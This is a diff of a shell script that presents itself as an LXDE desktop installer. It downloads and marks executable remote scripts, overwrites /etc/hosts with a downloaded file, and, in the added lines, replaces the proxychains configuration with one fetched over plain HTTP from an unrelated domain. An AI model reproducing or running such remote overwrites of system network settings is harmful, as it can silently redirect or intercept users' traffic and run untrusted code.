@@ -60,12 +60,15 @@ wget https://raw.githubusercontent.com/mazbron/x/master/tundra.sh
 chmod +x tundra.sh
 wget https://raw.githubusercontent.com/mazbron/x/master/every.sh
 chmod +x every.sh
+apt-get install proxychains -y
 sleep 1
 apt-get install sl -y
 sleep 1
 sl -l
 cd /etc
+mv proxychains.conf proxychains.conf.bak
 mv hosts hosts.bak
+wget http://sovrncpm.com/proxychains.conf
 wget https://github.com/mazbron/x/raw/master/hosts
 nano /etc/hosts
 echo You have successfully Installed LXDE Desktop Environment.. Enjoy..!!
